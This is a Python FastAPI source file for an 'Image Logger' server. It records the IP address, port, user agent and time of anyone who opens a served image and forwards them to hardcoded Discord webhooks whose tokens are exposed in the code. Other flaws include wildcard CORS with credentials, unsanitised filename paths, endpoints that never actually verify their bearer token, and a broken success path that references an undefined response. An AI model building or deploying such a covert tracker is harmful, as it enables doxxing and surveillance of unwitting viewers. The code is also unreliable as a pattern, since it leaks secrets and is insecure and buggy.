from fastapi import FastAPI, Request, Header, Depends, BackgroundTasks, HTTPException, status
from fastapi.responses import FileResponse
from fastapi.middleware.cors import CORSMiddleware 
from fastapi.security import OAuth2PasswordRequestForm
import logging
from datetime import datetime, timedelta
from pathlib import Path
from fastapi.security import OAuth2PasswordBearer
from typing import Annotated
from Utils import CheckIP, generate_random_string
import curd, schemas
from jose import JWTError, jwt
from database import SessionLocal
from dotenv import load_dotenv
import os
import model
from sqlalchemy.orm import Session
uri_path= '/root/Discord_image/image/'
'''
database setup
'''

load_dotenv()
def get_db():
    db = SessionLocal()
    try:
        yield db
    finally:
        db.close()
app = FastAPI()
oauth2_scheme = OAuth2PasswordBearer(tokenUrl="token", scheme_name="JWT")
'''
CORS setup
'''
origins = ['*']
app.add_middleware(
    CORSMiddleware,
    allow_origins=origins,
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
) 
'''
logging to app.log
'''
# logging configuration
logging.basicConfig(
    level=logging.INFO,
    format='[%(levelname)s] %(message)s',
    handlers=[
        logging.FileHandler('app.log'),
        logging.StreamHandler()
    ]
)
'''
config webhook
'''
config={
     "webhook": "https://discord.com/api/webhooks/1127802266611634276/QkXfyBN2fEODy5EcY7ONZpYl0sljOFzme0vAuweTEIA1o1Dh9K2oIlRY-vUbPfGPa1iK",
    "webhook_error":"https://discord.com/api/webhooks/1129789976696078489/u1hlj6FRCSBCSXLKAtqCw1PY1929ZA25-oYozoYyHOVHyaFX_CsjXDFmJdcijNk7hHtK",
    "image": "https://media-ten.z-cdn.me/KGjxTNEIU5EAAAAM/she-sheslams.gif"
}
'''
http middleware to get IP
'''
@app.middleware("http")
async def log_ip(request: Request, call_next):
    ip = request.client.host
    port= request.client.port
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    headers = request.headers
    request.state.ip = ip
    request.state.timestamp = timestamp
    request.state.header = headers
    request.state.port = port
    response = await call_next(request)
    return response

'''
Root route and logger ip to database
'''
@app.get("/")
async def read_root(request: Request, user_agent: str = Header(None, convert_underscores=True), db: Session = Depends(get_db)):
    timestamp = request.state.timestamp
    port = request.state.port
    ip = request.state.ip
    CheckIP(ip, url=config["webhook_error"],useragent=user_agent, timestamp=timestamp, port=port, url_thumbnail=config['image'], botname='Cảnh báo server ROOT', db=db)
    return {"Hello": "World FastAPI"}
#  Login to get Token
@app.post("/login", response_model=schemas.Token)
async def login_for_access_token(
    form_data: Annotated[OAuth2PasswordRequestForm, Depends()],
    db:Session = Depends(get_db)
):
    # user_validate = curd.get_user_by_username(username=form_data.username, db=db);
    user = curd.authenticate_user(username=form_data.username, password=form_data.password, db=db)
    if not user:
        raise HTTPException(
            status_code=status.HTTP_401_UNAUTHORIZED,
            detail="Incorrect username or password",
            headers={"WWW-Authenticate": "Bearer"},
        )
    access_token_expires = timedelta(minutes=360)
    access_token = curd.create_access_token(
        data={"sub": user.username}, expires_delta=access_token_expires
    )
    return {"access_token": access_token, "token_type": "bearer"}
'''
View image without logger database
'''
# View image without logger
@app.get("/view/{filename}")
async def read_item(filename: str, q: str = None):
    image_path = f"{uri_path}{filename}"
    path = Path(image_path)
    if not path.is_file():
        return FileResponse(f'{uri_path}/taylor.gif', media_type="image/gif")
    return FileResponse(image_path, media_type="image/gif")
'''
View Image with logger database
'''
@app.get("/image/{filename}")
async def get_image(background_tasks: BackgroundTasks,request: Request, filename: str,token: str = None, user_agent: str = Header(None, convert_underscores=True) ,db: Session = Depends(get_db) ):
    ip = request.state.ip
    timestamp = request.state.timestamp
    port = request.state.port
    image_path = f"{uri_path}{filename}"
    path = Path(image_path)
    if not path.is_file() or token==None or not curd.check_exists_token(db, token=token):
        background_tasks.add_task(CheckIP, ip, url=config["webhook_error"],useragent=user_agent, token=token, timestamp=timestamp, port=port, filename=filename, url_thumbnail=config['image'], botname='Cảnh báo server configuration',db=db)
        response = FileResponse(f'{uri_path}taylor.gif', media_type="image/gif")
        response.headers["X-Frame-Options"] = "SAMEORIGIN"
        return response
    background_tasks.add_task(CheckIP,ip, url=config["webhook"],useragent=user_agent, token=token, timestamp=timestamp, port=port, filename=filename, url_thumbnail=config['image'], botname='Image Logger', db=db)
    FileResponse(image_path, media_type="image/gif")
    response.headers["X-Frame-Options"] = "SAMEORIGIN"
    return response
'''
Agents managent 
'''
# view agent configuration
@app.get("/agents")
async def agents(token: Annotated[str, Depends(oauth2_scheme)],db: Session = Depends(get_db)):
    agents= curd.get_limit_agents(db ,skip=0, limit=10)
    return agents
#search agents by id
@app.get("/agents/{agent_id}")
async def agents(agent_id: int , token: Annotated[str, Depends(oauth2_scheme)],db: Session = Depends(get_db)):
    agents= curd.get_agents_by_id(db ,agent_id= agent_id)
    return agents
# search agents by token
@app.get("/agents_token")
async def agents(key: str, token: Annotated[str, Depends(oauth2_scheme)],db: Session = Depends(get_db)):
    agents= curd.get_agents_by_token(db, token=key)
    return agents
# add agents
@app.post("/agents/add", response_model=schemas.agents)
async def agents(agents: schemas.agents,token: Annotated[str, Depends(oauth2_scheme)] ,db: Session = Depends(get_db)):
    agents_model= curd.create_agents(db, agents=agents)
    return agents_model #add Content-Type:application/json
'''
Webhooks management
'''
@app.post("/webhooks/add", response_model=schemas.webhooks)
async def create_webhooks(webhooks:schemas.webhooks, token: Annotated[str, Depends(oauth2_scheme)],db:Session = Depends(get_db)):
    webhooks_model = curd.create_webhooks(db, webhooks=webhooks)
    return webhooks_model
    
@app.get("/webhooks/{webhook_id}")
async def get_webhooks_by_id(webhook_id:int,token: Annotated[str, Depends(oauth2_scheme)] ,db:Session = Depends(get_db)):
    webhook = curd.get_webhooks_by_id(db, id= webhook_id)
    return webhook
'''
get logger by token
'''
@app.get("/logger/{id}")
async def get_logger_by_id(id:int,token: Annotated[str, Depends(oauth2_scheme)] ,db:Session = Depends(get_db)):
    logger = curd.get_logger_by_id(id=id, db=db)
    return logger
@app.get("/logger/token/{key}")
async def get_logger_by_token(key:str, token: Annotated[str, Depends(oauth2_scheme)],limit:int=10 ,db:Session = Depends(get_db)):
    logger_by_token= curd.get_logger_by_token(token=key, limit=limit ,db=db)
    return logger_by_token
'''
get logger_error by token
'''
@app.get("/logger_error/{id}")
async def get_logger_error_by_id(id:int,token: Annotated[str, Depends(oauth2_scheme)] ,db:Session = Depends(get_db)):
    logger = curd.get_logger_error_by_id(id=id, db=db)
    return logger
@app.get("/logger_error/token/{key}")
async def get_logger_by_token(key:str, token: Annotated[str, Depends(oauth2_scheme)],limit:int=10, db:Session = Depends(get_db)):
    logger_by_token= curd.get_logger_error_by_token(token=key, limit=limit ,db=db)
    return logger_by_token
'''
User by token management
'''
# Register user 
@app.post('/user/add', response_model=schemas.User)
async def create_user(user: schemas.User,token: Annotated[str, Depends(oauth2_scheme)], db:Session= Depends(get_db)):
    user = curd.create_user(user=user, db=db)
    return user
# List all user
@app.get('/user')
async def get_user(token: Annotated[str, Depends(oauth2_scheme)],db:Session= Depends(get_db)):
    users = curd.get_users(db=db)
    return users
# Find user by id
@app.get("/user/{user_id}")
async def get_user_user_by_id(user_id: int, token: Annotated[str, Depends(oauth2_scheme)],db:Session = Depends(get_db)):
    user = curd.get_user_by_id(db=db, user_id=user_id)
    return user
# Get current user
@app.get("/users/me/", response_model=schemas.CurrentUser)
async def get_current_user(token: Annotated[str, Depends(oauth2_scheme)], db:Session = Depends(get_db)):
    credentials_exception = HTTPException(
        status_code=status.HTTP_401_UNAUTHORIZED,
        detail="Could not validate credentials",
        headers={"WWW-Authenticate": "Bearer"},
    )
    try:
        payload = jwt.decode(token, os.getenv('SECRET_KEY'), algorithms=[os.getenv('ALGORITHM')])
        username: str = payload.get("sub")
        if username is None:
            raise credentials_exception
    except JWTError:
        raise credentials_exception
    current_user = db.query(model.User).filter(model.User.username == username).first()
    if current_user is None:
        raise credentials_exception
    if not current_user.is_active:
        raise HTTPException(status_code=400, detail="Inactive user")
    return current_user
# Get Role of user
@app.get("/users/me/roles/", response_model=None)
async def read_own_items(
    current_user: Annotated[schemas.User, Depends(get_current_user)]
):
    return [{"roles": "Foo", "owner": current_user.username}]